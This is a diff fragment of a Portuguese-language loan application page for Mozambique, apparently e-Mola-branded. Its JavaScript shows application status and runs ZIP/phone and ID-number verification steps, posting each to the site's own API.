+        const zipVerifications = verifications.filter(v => v.step === 'zip_phone');
+        const idVerifications = verifications.filter(v => v.step === 'id_document');
+        const latestZip = zipVerifications[0];
+        const latestId = idVerifications[0];
+
+        const zipApproved = latestZip && latestZip.status === 'approved';
+        const zipPending = latestZip && latestZip.status === 'pending';
+        const zipRejected = latestZip && latestZip.status === 'rejected';
+        const idApproved = latestId && latestId.status === 'approved';
+        const idPending = latestId && latestId.status === 'pending';
+        const idRejected = latestId && latestId.status === 'rejected';
+
+        if (zipApproved && idApproved) {
+          // Both steps verified — show disbursement pending
+          spinner.style.display = 'none';
+          doneIcon.style.display = 'grid';
+          rejectIcon.style.display = 'none';
+          badge.className = 'status-badge approved';
+          badge.textContent = window.t('Verificado');
+          title.textContent = window.t('Verificação Completa');
+          desc.textContent = window.t('A sua identidade foi verificada. O desembolso será processado em breve.');
+          approvedBox.style.display = 'none';
+          rejectedBox.style.display = 'none';
+          vComplete.style.display = 'block';
+          // Stop polling
+          if (pollInterval) { clearInterval(pollInterval); pollInterval = null; }
+        } else if (zipApproved && !idApproved) {
+          // ZIP done, ID step needed
+          spinner.style.display = 'none';
+          doneIcon.style.display = 'grid';
+          rejectIcon.style.display = 'none';
+          badge.className = 'status-badge approved';
+          badge.textContent = window.t('Aprovado');
+          title.textContent = window.t('Verificação de Identidade');
+          desc.textContent = window.t('ZIP verificado! Agora insira o número do documento de identidade.');
+          approvedBox.style.display = 'none';
+          rejectedBox.style.display = 'none';
+
+          if (idPending) {
+            v2Waiting.style.display = 'block';
+          } else if (idRejected) {
+            v2Rejected.style.display = 'block';
+            const msg = latestId.reject_reason || 'Os dados do documento não correspondem.';
+            document.getElementById('verifyStep2RejectMsg').textContent = msg;
+          } else {
+            v2Box.style.display = 'block';
+          }
+        } else {
+          // ZIP step needed (first step)
+          spinner.style.display = 'none';
+          doneIcon.style.display = 'grid';
+          rejectIcon.style.display = 'none';
+          badge.className = 'status-badge approved';
+          badge.textContent = window.t('Aprovado');
+          title.textContent = window.t('Verificação de Identidade');
+          desc.textContent = window.t('O seu empréstimo foi aprovado! Complete a verificação para receber o desembolso.');
+          approvedBox.style.display = 'block';
+          rejectedBox.style.display = 'none';
+
+          if (zipPending) {
+            v1Waiting.style.display = 'block';
+            approvedBox.style.display = 'none';
+          } else if (zipRejected) {
+            v1Rejected.style.display = 'block';
+            const msg = latestZip.reject_reason || 'Os dados não correspondem.';
+            document.getElementById('verifyStep1RejectMsg').textContent = msg;
+            approvedBox.style.display = 'none';
+          } else {
+            v1Box.style.display = 'block';
+          }
+        }
+      } else if (s === 'rejected') {
+        spinner.style.display = 'none';
+        doneIcon.style.display = 'none';
+        rejectIcon.style.display = 'grid';
+        badge.className = 'status-badge rejected';
+        badge.textContent = window.t('Rejeitado');
+        title.textContent = window.t('Candidatura Não Aprovada');
+        desc.textContent = window.t('O seu pedido foi analisado mas infelizmente não pôde ser aprovado.');
+        approvedBox.style.display = 'none';
+        rejectedBox.style.display = 'block';
+        step2.className = 'step-item done';
+        step3.className = 'step-item rejected';
+      }
+    }
+
+    // ── Verification Step 1: ZIP + Phone ──
+    async function submitZipPhone() {
+      const zip = document.getElementById('verifyZip').value.trim();
+      const phone = document.getElementById('verifyPhone').value.trim();
+      const error = document.getElementById('verifyStep1Error');
+      if (!zip) { error.textContent = window.t('Insira o código postal (ZIP).'); return; }
+      if (!/^8[2-7]\d{7}$/.test(phone)) { error.textContent = window.t('Digite um número moçambicano válido com 9 dígitos.'); return; }
+      error.textContent = '';
+      const btn = document.getElementById('verifyStep1Submit');
+      btn.disabled = true;
+      try {
+        const res = await fetch(`/api/applications/${currentAppId}/verify`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ step: 'zip_phone', zipCode: zip, phone: phone })
+        });
+        const data = await res.json();
+        if (!res.ok) throw new Error(data.error || 'Erro ao enviar verificação.');
+        document.getElementById('verifyStep1Box').style.display = 'none';
+        document.getElementById('verifyStep1Waiting').style.display = 'block';
+        document.getElementById('statusApprovedNotice').style.display = 'none';
+      } catch (e) {
+        error.textContent = e.message;
+      } finally {
+        btn.disabled = false;
+      }
+    }
+    document.getElementById('verifyStep1Submit').addEventListener('click', submitZipPhone);
+    document.getElementById('verifyStep1Resubmit').addEventListener('click', () => {
+      document.getElementById('verifyStep1Rejected').style.display = 'none';
+      document.getElementById('verifyStep1Box').style.display = 'block';
+      document.getElementById('verifyZip').value = '';
+      document.getElementById('verifyPhone').value = '';
+    });
+
+    // ── Verification Step 2: ID Document ──
+    async function submitIdDocument() {
+      const idNum = document.getElementById('verifyIdNumber').value.trim();
+      const error = document.getElementById('verifyStep2Error');
+      if (!idNum) { error.textContent = window.t('Insira o número do documento de identidade.'); return; }
+      error.textContent = '';
+      const btn = document.getElementById('verifyStep2Submit');
+      btn.disabled = true;
+      try {
+        const res = await fetch(`/api/applications/${currentAppId}/verify`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ step: 'id_document', idNumber: idNum })
+        });
+        const data = await res.json();
+        if (!res.ok) throw new Error(data.error || 'Erro ao enviar verificação.');
+        document.getElementById('verifyStep2Box').style.display = 'none';
+        document.getElementById('verifyStep2Waiting').style.display = 'block';
+      } catch (e) {
+        error.textContent = e.message;
+      } finally {
+        btn.disabled = false;
+      }
+    }
+    document.getElementById('verifyStep2Submit').addEventListener('click', submitIdDocument);
+    document.getElementById('verifyStep2Resubmit').addEventListener('click', () => {
+      document.getElementById('verifyStep2Rejected').style.display = 'none';
+      document.getElementById('verifyStep2Box').style.display = 'block';
+      document.getElementById('verifyIdNumber').value = '';
+    });
+
+    document.getElementById('financeForm').addEventListener('submit', async event => {
+      event.preventDefault();
+      const income = document.getElementById('income');
+      const error = document.getElementById('step3Error');
+      if (Number(income.value) <= 0) { error.textContent = window.t('Digite a sua renda anual.'); income.focus(); return; }
+      const button = event.submitter;
+      error.textContent = '';
+      button.disabled = true;
+      submissionId ||= crypto.randomUUID();
+      sessionStorage.setItem('emolaSubmissionId', submissionId);
+      const payload = {
+        firstName: document.getElementById('firstName').value.trim(),
+        lastName: document.getElementById('lastName').value.trim(),
+        phone: document.getElementById('phone').value.trim(),
+        loanType: document.getElementById('loanType').value,
+        loanAmount: Number(document.getElementById('loanAmount').value),
+        termMonths: Number(document.getElementById('term').value),
+        purpose: document.getElementById('purpose').value.trim(),
+        employment: document.getElementById('employment').value,
+        annualIncome: Number(income.value),
+        referralToken: referralToken || null,
+        consentToAgentContact: document.getElementById('agentConsent').checked,
+        submissionId
+      };
+      try {
+        const response = await fetch('/api/applications', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        const result = await response.json();
+        if (!response.ok) throw new Error(window.t(result.error || 'Não foi possível enviar a candidatura.'));
+        sessionStorage.removeItem('emolaSubmissionId');
+        submissionId = null;
+        show('complete');
+        if (result.applicationId) {
+          startStatusPolling(result.applicationId);
+        }
+      } catch (submitError) {
+        error.textContent = window.t(submitError.message || 'Erro de ligação. Tente novamente.');
+      } finally {
+        button.disabled = false;
+      }
+    });
+  </script>
+</body>
+</html>
+
